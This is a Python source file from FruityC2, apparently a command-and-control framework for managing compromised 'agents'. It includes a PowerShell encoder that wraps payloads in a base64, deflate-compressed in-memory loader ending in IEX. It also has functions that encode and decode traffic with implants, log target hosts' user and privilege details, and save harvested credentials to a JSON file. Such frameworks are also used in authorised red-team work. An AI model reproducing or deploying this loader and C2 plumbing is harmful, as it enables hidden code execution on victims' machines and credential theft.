#!/usr/bin/python

# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os, sys, getopt
import traceback
import re
import json
import time, datetime
import base64
import binascii
import zlib
import glob
from multiprocessing import Process
import socket
import ssl

# LIBS
from lib.global_data import *

def print_banner():
    banner = '''  ___         _ _         ___ ___ 
 | __| _ _  _(_) |_ _  _ / __|_  )
 | _| '_| || | |  _| || | (__ / / 
 |_||_|  \_,_|_|\__|\_, |\___/___|
                    |__/          '''

    print banner
    print ""

def usage():
    print "\nFruityC2 " + gVersion + " by @xtr4nge"
    
    print "Usage: FruityC2 <options>\n"
    print "Options:"
    print "-c <profile>, --profile=<profile>  Default profile."
    print "-s <server>, --server=<server>     C2 server IP."
    print "-p <port>, --port=<port>           C2 server port."
    print "-h                                 Print this help message."
    print ""
    print "FruityC2: http://www.fruitywifi.com"
    print ""

def parseOptions(argv):
    profileConfig  = "profiles/amazon.json"
    server_ip = ""
    server_port = ""
    
    try:                                
        opts, args = getopt.getopt(argv, "hc:s:p:", 
                                   ["help","config=","server=","port="])
        
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-c", "--config"):
                profileConfig = arg
            elif opt in ("-s", "--server"):
                server_ip = arg
            elif opt in ("-p", "--port"):
                server_port = arg

        return (profileConfig, server_ip, server_port)
                    
    except getopt.GetoptError:
        usage()
        sys.exit()

class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERL = '\033[4m'
    ENDC = '\033[0m'
    GRAY = '\033[30m'
    LIGHTGRAY = '\033[37m'

# CHECKS IF PORT IS OPEN/CLOSE
def check_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1',int(port)))
    if result == 0: # Port is open
       return True
    else: # Port is not open
       return False

# ENCODE POWERSHELL COMMAND
# REF: https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
def powershell_encoder(data):
    #print "powershell_encoder"
    blank_command = ""
    powershell_command = ""
    n = re.compile(u'(\xef|\xbb|\xbf)')
    for char in (n.sub("", data)):
        blank_command += char + "\x00"
    powershell_command = blank_command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command

# ENCODE AND COMPRESS POWERSHELL COMMAND
def powershell_encoder_deflate(data):
    #print "powershell_encoder_deflate"
    try:
        compressed_encoded = base64.b64encode(deflate(data))
        
        # DECODE, INFLATE AND EXEC SCRIPT
        code = "$data = \"%s\";" % compressed_encoded
        code += "$data = [System.Convert]::FromBase64String($data);"
        code += "$ms = New-Object System.IO.MemoryStream;"
        code += "$ms.Write($data, 0, $data.Length);"
        code += "$ms.Seek(0,0) | Out-Null;"
        code += "$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress));"
        code += "IEX $sr.ReadToEnd();"
        
        data = code
        
        blank_command = ""
        powershell_command = ""
        n = re.compile(u'(\xef|\xbb|\xbf)')
        
        for char in (n.sub("", data)):
            blank_command += char + "\x00"
        
        powershell_command = blank_command
        powershell_command = base64.b64encode(powershell_command)
        return powershell_command
    except:
        print traceback.print_exc()

# ENCRYPT DATA
def encrypt(data):
    # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)
    
    return data

# DECRYPT DATA
def decrypt(data):
    # NOTE: You need to implement your own encryption/decryption method. (FUNCTION: encrypt and decrypt)
    
    return data

# ENCODE TO B64 URLSAFE
def b64encoder(data): # URLSAFE
    data = base64.b64encode(data)
    data = data.replace("+", "-") # BASE64 URLSAFE
    data = data.replace("/", "_") # BASE64 URLSAFE
    return data    

# DEENCODE FROM B64 URLSAFE
def b64decoder(data): # URLSAFE
    data = data.replace("-", "+") # BASE64 URLSAFE
    data = data.replace("_", "/") # BASE64 URLSAFE
    data = base64.b64decode(data)
    return data

# COMPRESS DATA
def deflate(data): # COMPRESS DATA: https://gist.github.com/w-vi/9916230
    compress = zlib.compressobj(9, zlib.DEFLATED, -15, zlib.DEF_MEM_LEVEL, 0)
    deflated = compress.compress(data)
    deflated += compress.flush()
    #return base64.b64encode(deflated)
    return deflated

# DECOMPRESS DATA
def inflate(data): # DECOMPRESS DATA: https://gist.github.com/w-vi/9916230
    #data = base64.b64decode(data)
    decompress = zlib.decompressobj(-15)
    inflated = decompress.decompress(data)
    inflated += decompress.flush()
    return inflated

# DECODE/DECRYPT RECEIVED DATA FROM AGENT
def rx_data(data):
    try:
        global option_base64
        global option_encryption
        global option_compression
        
        if option_base64: data = b64decoder(data)
        if option_compression: data = inflate(b64decoder(data))
        if option_encryption: data = decrypt(data)
        
        return data
    except:
        pass
        #print traceback.print_exc()
        
# ENCODE/ENCRYPT DATA TO BE SENT TO AGENT
def tx_data(data):
    try:
        global option_base64
        global option_encryption
        global option_compression
            
        if option_encryption: data = encrypt(data)    
        if option_compression: data = b64encoder(deflate(data))
        if option_base64: data = b64encoder(data)
        
        return data
    except:
        pass
        #print traceback.print_exc()
        
# STORE RAW LOG (COMMAND AND RESULTS)
def save_log_raw(uuid, data):    
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    f = open("logs/target/" + str(uuid) + ".log", 'a+')
    data = data.replace("\n\n\n","\n")
    f.write(data)
    f.close()

# STORE JSON LOG (COMMAND AND RESULTS)
def save_log_json(uuid):    
    data = {
        "uuid": uuid,
        "os_version": gdata.target[uuid]["name"],
        "name": gdata.target[uuid]["name"],
        "ip": gdata.target[uuid]["ip"],
        "exec": gdata.target[uuid]["exec"],
        "sleep": gdata.target[uuid]["sleep"],
        "user": gdata.target[uuid]["user"],
        "level": gdata.target[uuid]["level"],
        "checkin": gdata.target[uuid]["checkin"]
    }
    
    f = open('logs/data.json', 'a+')
    f.write(json.dumps(data) + "\n")
    f.close()

# -----------------------
# FUNCTIONS CHAT
# -----------------------
def load_chat(cid=0):
    #chat = []
    data = ""
    with open('logs/chat.json') as lines:
        for line in lines:
            line = line.strip()
            data += line + ","
    
    chat = json.loads("[%s]" % data[:-1])
    
    # SORT JSON
    sort_chat =  sorted(chat, key=lambda x: x["id"], reverse=False)

    # SHOW ONLY > ID
    output = []
    for i in sort_chat:
        if i["id"] > int(cid):
            output.append(i)
    
    return output

def store_chat(user, msg):
    timestamp = int(time.time())
    user = user
    msg = msg
    
    data = {"id": timestamp,
            "user": user,
            "msg": msg
            }
    
    f = open('logs/chat.json', 'a+')
    f.write(json.dumps(data) + "\n")
    f.close()

# -----------------------
# FUNCTIONS ALERT
# -----------------------
def load_alert(aid=0):
    data = ""
    with open('logs/alert.json') as lines:
        for line in lines:
            line = line.strip()
            data += line + ","
    
    alert = json.loads("[%s]" % data[:-1])
    
    # SORT JSON
    sort_alert =  sorted(alert, key=lambda x: x["id"], reverse=False)
    # SHOW ONLY > ID
    output = []
    for i in sort_alert:
        if i["id"] > int(aid):
            output.append(i)
        
    return output

# STORE TARGETS (agents) AS JSON (config/target.json)
def store_target():
    f = open('config/target.json', 'w')
    f.write(json.dumps(gdata.target))
    f.close()

# STORE CREDENTIALS AS JSON (data/credentials.json)
def store_credentials():    
    f = open('data/credentials.json', 'w')
    f.write(json.dumps(gdata.credentials))
    f.close()

